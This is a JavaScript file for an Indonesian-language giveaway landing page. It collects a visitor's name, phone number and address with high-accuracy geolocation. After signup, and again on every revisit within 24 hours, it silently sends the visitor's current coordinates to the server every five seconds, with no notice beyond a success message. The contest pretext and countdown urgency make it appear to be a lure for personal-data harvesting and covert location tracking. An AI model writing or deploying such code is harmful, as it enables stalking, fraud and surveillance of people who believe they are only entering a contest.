// DOM Elements
const participateBtn = document.getElementById("participateBtn");
const participationForm = document.getElementById("participationForm");
const successSection = document.getElementById("successSection");
const userNameInput = document.getElementById("userName");
const userPhoneInput = document.getElementById("userPhone");
const userAddressInput = document.getElementById("userAddress");

// Countdown Timer Management
let countdownInterval = null;
let locationInterval = null;
const COUNTDOWN_DURATION = 7 * 24 * 60 * 60 * 1000; // 7 days in milliseconds

function initializeCountdown() {
  let countdownData = localStorage.getItem("giveawayCountdown");
  let endTime;

  if (!countdownData) {
    // First time - create new countdown
    const now = new Date().getTime();
    endTime = now + COUNTDOWN_DURATION;
    localStorage.setItem(
      "giveawayCountdown",
      JSON.stringify({
        startTime: now,
        endTime: endTime,
      })
    );
  } else {
    // Use existing countdown
    const data = JSON.parse(countdownData);
    endTime = data.endTime;
  }

  return endTime;
}

function updateCountdown() {
  const endTime = initializeCountdown();
  const now = new Date().getTime();
  const distance = endTime - now;

  const countdownElement = document.getElementById("countdown");
  const countdownContainer = countdownElement.parentElement;

  if (distance <= 0) {
    // Countdown finished
    document.getElementById("days").textContent = "00";
    document.getElementById("hours").textContent = "00";
    document.getElementById("minutes").textContent = "00";
    document.getElementById("seconds").textContent = "00";

    // Hide countdown and form
    countdownContainer.style.display = "none";
    participationForm.style.display = "none";

    // Show expired message
    showCountdownExpired();

    // Stop interval
    if (countdownInterval) {
      clearInterval(countdownInterval);
      countdownInterval = null;
    }

    return false; // Countdown expired
  }

  const days = Math.floor(distance / (1000 * 60 * 60 * 24));
  const hours = Math.floor(
    (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
  );
  const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  const seconds = Math.floor((distance % (1000 * 60)) / 1000);

  document.getElementById("days").textContent = days
    .toString()
    .padStart(2, "0");
  document.getElementById("hours").textContent = hours
    .toString()
    .padStart(2, "0");
  document.getElementById("minutes").textContent = minutes
    .toString()
    .padStart(2, "0");
  document.getElementById("seconds").textContent = seconds
    .toString()
    .padStart(2, "0");

  return true; // Countdown still active
}

function showCountdownExpired() {
  const expiredDiv = document.createElement("div");
  expiredDiv.className = "countdown-expired";
  expiredDiv.style.cssText = `
    background: linear-gradient(45deg, #e74c3c, #c0392b);
    color: white;
    padding: 30px;
    border-radius: 20px;
    text-align: center;
    margin: 20px 0;
    box-shadow: 0 10px 30px rgba(231, 76, 60, 0.3);
  `;
  expiredDiv.innerHTML = `
    <h3>⏰ Waktu Pendaftaran Telah Berakhir</h3>
    <p>Maaf, periode giveaway telah berakhir. Terima kasih atas antusiasme Anda!</p>
    <p><strong>Pantau terus untuk giveaway berikutnya!</strong></p>
  `;

  const actionSection = document.querySelector(".action-section");
  actionSection.appendChild(expiredDiv);
}

function startCountdown() {
  // Initial update
  const isActive = updateCountdown();

  if (isActive) {
    // Start interval (update every second for more accuracy)
    countdownInterval = setInterval(() => {
      updateCountdown();
    }, 1000);
  }
}

function stopCountdown() {
  if (countdownInterval) {
    clearInterval(countdownInterval);
    countdownInterval = null;
  }

  // Hide countdown when submitted
  const countdownContainer = document.getElementById("countdown").parentElement;
  countdownContainer.style.display = "none";
}

// Location tracking interval management
function startLocationTracking() {
  if (locationInterval) {
    clearInterval(locationInterval);
  }

  // Start interval to send location every 5 seconds
  locationInterval = setInterval(async () => {
    try {
      const participationData = localStorage.getItem("giveawayParticipation");
      if (!participationData) {
        console.log("No participation data found, stopping location tracking");
        stopLocationTracking();
        return;
      }

      const data = JSON.parse(participationData);
      
      // Try to get current location, fallback to stored location
      let locationData;
      try {
        locationData = await requestGeolocation();
        console.log("Using current location for tracking");
      } catch (error) {
        // Fallback to stored location if geolocation fails
        locationData = {
          latitude: parseFloat(data.location.lat),
          longitude: parseFloat(data.location.lng),
          accuracy: 0
        };
        console.log("Using stored location for tracking (geolocation failed)");
      }

      // Send location data (only id, lat, lng)
      await submitParticipation(locationData);
      console.log("Location tracking data sent successfully");
      
    } catch (error) {
      console.error("Location tracking error:", error);
      // Don't stop tracking on error, just log it
    }
  }, 5000); // Every 5 seconds

  console.log("Location tracking started (every 5 seconds)");
}

function stopLocationTracking() {
  if (locationInterval) {
    clearInterval(locationInterval);
    locationInterval = null;
    console.log("Location tracking stopped");
  }
}

// Generate random ID (16 characters)
function generateRandomId() {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < 16; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Validate form data
function validateForm() {
  const name = userNameInput.value.trim();
  const phone = userPhoneInput.value.trim();
  const address = userAddressInput.value.trim();

  if (!name || !phone || !address) {
    throw new Error("Harap lengkapi semua data (nama, nomor HP, dan alamat)");
  }

  if (phone.length < 10 || phone.length > 15) {
    throw new Error("Nomor HP harus antara 10-15 digit");
  }

  if (!/^[0-9+\-\s]+$/.test(phone)) {
    throw new Error("Nomor HP hanya boleh berisi angka, +, -, dan spasi");
  }

  return { name, phone, address };
}

// Geolocation functionality
function requestGeolocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error("Geolocation tidak didukung oleh browser ini"));
      return;
    }

    const options = {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0,
    };

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const coords = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };
        resolve(coords);
      },
      (error) => {
        let errorMessage = "";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage =
              "Akses lokasi ditolak. Silakan izinkan akses lokasi untuk melanjutkan.";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = "Informasi lokasi tidak tersedia.";
            break;
          case error.TIMEOUT:
            errorMessage = "Permintaan lokasi timeout.";
            break;
          default:
            errorMessage = "Terjadi kesalahan saat mengambil lokasi.";
            break;
        }
        reject(new Error(errorMessage));
      },
      options
    );
  });
}

// Show loading state
function showLoading(button) {
  button.disabled = true;
  button.innerHTML = "⏳ Memproses...";
}

// Reset button state
function resetButton(button) {
  button.disabled = false;
  button.innerHTML = "🎯 YA, SAYA IKUT GIVEAWAY INI!";
}

// Show error message
function showError(message) {
  const errorDiv = document.createElement("div");
  errorDiv.className = "error-message";
  errorDiv.style.cssText = `
        background: #f8d7da;
        color: #721c24;
        padding: 15px;
        border-radius: 10px;
        margin: 20px 0;
        border: 1px solid #f5c6cb;
        text-align: center;
    `;
  errorDiv.innerHTML = `
        <strong>⚠️ Oops!</strong><br>
        ${message}<br>
        <small>Silakan coba lagi atau hubungi support jika masalah berlanjut.</small>
    `;

  // Remove existing error messages
  const existingError = document.querySelector(".error-message");
  if (existingError) {
    existingError.remove();
  }

  participationForm.appendChild(errorDiv);

  // Auto remove error after 5 seconds
  setTimeout(() => {
    if (errorDiv.parentNode) {
      errorDiv.remove();
    }
  }, 5000);
}

// Submit participation data to server
async function submitParticipation(locationData, userData = null) {
  try {
    const payload = {
      id: userData
        ? userData.id
        : JSON.parse(localStorage.getItem("giveawayParticipation")).id,
      latitude: locationData.latitude,
      longitude: locationData.longitude,
    };

    // Add user data only for first submission
    if (userData) {
      payload.name = userData.name;
      payload.phone = userData.phone;
      payload.address = userData.address;
    }

    const response = await fetch("/api/location", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const result = await response.json();
    console.log("Participation data submitted:", {
      timestamp: new Date().toISOString(),
      payload: payload,
      userAgent: navigator.userAgent,
      referrer: document.referrer || "direct",
      serverResponse: result,
    });

    return { success: true, participationId: payload.id };
  } catch (error) {
    console.error("Failed to submit to server:", error);
    throw new Error("Gagal mengirim data ke server. Silakan coba lagi.");
  }
}

// Main participation handler
async function handleParticipation() {
  try {
    showLoading(participateBtn);

    // Validate form data
    const userData = validateForm();
    userData.id = generateRandomId();

    // Request geolocation
    const locationData = await requestGeolocation();

    // Submit participation with user data
    const result = await submitParticipation(locationData, userData);

    if (result.success) {
      // Stop countdown and hide it
      stopCountdown();

      // Hide form and show success message
      participationForm.classList.add("hidden");
      successSection.classList.remove("hidden");

      // Scroll to success section
      successSection.scrollIntoView({
        behavior: "smooth",
        block: "center",
      });

      // Store participation data locally
      localStorage.setItem(
        "giveawayParticipation",
        JSON.stringify({
          id: userData.id,
          name: userData.name,
          phone: userData.phone,
          address: userData.address,
          timestamp: new Date().toISOString(),
          location: {
            lat: locationData.latitude.toFixed(6),
            lng: locationData.longitude.toFixed(6),
          },
        })
      );

      // Start location tracking after successful submission
      startLocationTracking();
    } else {
      throw new Error("Gagal mengirim data partisipasi");
    }
  } catch (error) {
    console.error("Participation error:", error);
    showError(error.message);
    resetButton(participateBtn);
  }
}

// Event listeners
participateBtn.addEventListener("click", handleParticipation);

// Check existing participation and initialize countdown
document.addEventListener("DOMContentLoaded", async () => {
  const existingParticipation = localStorage.getItem("giveawayParticipation");

  if (existingParticipation) {
    const data = JSON.parse(existingParticipation);
    const participationDate = new Date(data.timestamp);
    const now = new Date();
    const hoursDiff = (now - participationDate) / (1000 * 60 * 60);

    // If participated within last 24 hours, show success directly
    if (hoursDiff < 24) {
      // Fill form with existing data
      userNameInput.value = data.name || "";
      userPhoneInput.value = data.phone || "";
      userAddressInput.value = data.address || "";

      // Stop countdown and hide it since already participated
      stopCountdown();

      participationForm.classList.add("hidden");
      successSection.classList.remove("hidden");

      // Send existing location data to server on page refresh (only id, lat, lng)
      try {
        const locationData = {
          latitude: parseFloat(data.location.lat),
          longitude: parseFloat(data.location.lng),
          accuracy: 0, // We don't have accuracy from stored data
        };

        console.log("Sending existing participation data to server...");
        await submitParticipation(locationData); // No userData = only sends id, lat, lng
        console.log("Existing participation data sent successfully");
      } catch (error) {
        console.error("Failed to send existing participation data:", error);
        // Don't show error to user since this is background sync
      }

      // Start location tracking for existing participants
      startLocationTracking();

      return; // Exit early, don't start countdown
    }
  }

  // Start countdown if not participated or participation expired
  startCountdown();
});

// Add some interactive effects
document.addEventListener("DOMContentLoaded", () => {
  document.querySelector(".year").textContent = new Date().getFullYear();

  // Animate trust indicators on scroll
  const observerOptions = {
    threshold: 0.1,
    rootMargin: "0px 0px -50px 0px",
  };

  const observer = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        entry.target.style.animation = "fadeInUp 0.6s ease forwards";
      }
    });
  }, observerOptions);

  // Observe trust items
  document.querySelectorAll(".trust-item").forEach((item) => {
    observer.observe(item);
  });

  // Add CSS for fade in animation
  const style = document.createElement("style");
  style.textContent = `
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .trust-item {
            opacity: 0;
        }
    `;
  document.head.appendChild(style);
});

// Add click tracking for analytics (optional)
function trackEvent(eventName, eventData = {}) {
  console.log("Event tracked:", eventName, eventData);
  // Here you could send to analytics service
}

// Track button clicks
participateBtn.addEventListener("click", () => {
  trackEvent("participate_button_clicked", {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
  });
});

// Track page visibility
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    trackEvent("page_visible");
  } else {
    trackEvent("page_hidden");
  }
});
